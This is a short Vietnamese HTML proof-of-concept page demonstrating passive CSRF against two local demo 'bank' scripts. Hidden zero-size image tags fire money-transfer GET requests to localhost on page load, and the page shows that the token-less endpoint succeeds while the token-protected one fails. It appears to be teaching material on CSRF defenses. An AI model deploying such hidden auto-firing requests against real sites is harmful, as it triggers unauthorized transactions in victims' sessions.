<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Trang Web Độc Hại - CSRF Thụ Động</title>
    <style>
        /* CSS Tối Giản */
        body { 
            font-family: Arial, sans-serif; 
            background-color: #f8f8f8; /* Nền xám nhạt */
            padding: 40px; 
            color: #333;
        }
        .container {
            max-width: 700px;
            margin: 0 auto;
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            border-left: 5px solid #cc0000; /* Điểm nhấn cảnh báo */
        }
        h1 { 
            color: #cc0000; 
            border-bottom: 2px solid #eee; 
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        h2 { 
            color: #555; 
            font-size: 1.2em;
            margin-top: 25px;
        }
        p { margin-bottom: 10px; line-height: 1.6; }
        .status-box {
            padding: 10px;
            border-radius: 4px;
            margin-top: 15px;
            font-weight: bold;
        }
        .success { 
            color: #155724; 
            background-color: #d4edda; 
            border: 1px solid #c3e6cb;
        }
        .failure { 
            color: #721c24; 
            background-color: #f8d7da; 
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Trang Web Độc Hại (PoC CSRF Thụ Động)</h1>
        <p>Đây là trang web quảng cáo lừa đảo. Khi tải trang, mã độc vô hình sẽ tự động kích hoạt các yêu cầu giao dịch.</p>

        <div>
            <h2>1. Tấn công Ngân hàng 1 (Lỗ hổng GET - Cổ điển)</h2>
            <p><strong>Kỹ thuật:</strong> Sử dụng thẻ IMG vô hình để buộc trình duyệt gửi lệnh chuyển khoản GET.</p>
            
            <img src="http://localhost/csrf_demo2/bank1.php?transfer=100" style="display:none" width="0" height="0" alt="Tấn công Bank 1">
            
            <div class="status-box success">
                Trạng thái: Đã kích hoạt lệnh chuyển khoản! (Dự kiến: **THÀNH CÔNG** do không có Token)
            </div>
        </div>

        <div>
            <h2>2. Thử tấn công Ngân hàng 2 (Bị chặn do Thiếu TOKEN)</h2>
            <p><strong>Kỹ thuật:</strong> Tương tự, sử dụng thẻ IMG để gửi lệnh chuyển khoản.</p>

            <img src="http://localhost/csrf_demo2/bank2.php?transfer=100" style="display:none" width="0" height="0" alt="Tấn công Bank 2">
            
            <div class="status-box failure">
                Trạng thái: Lệnh đã gửi nhưng bị từ chối! (Dự kiến: **THẤT BẠI** do yêu cầu có tham số `token`)
            </div>
        </div>
    </div>
</body>
</html>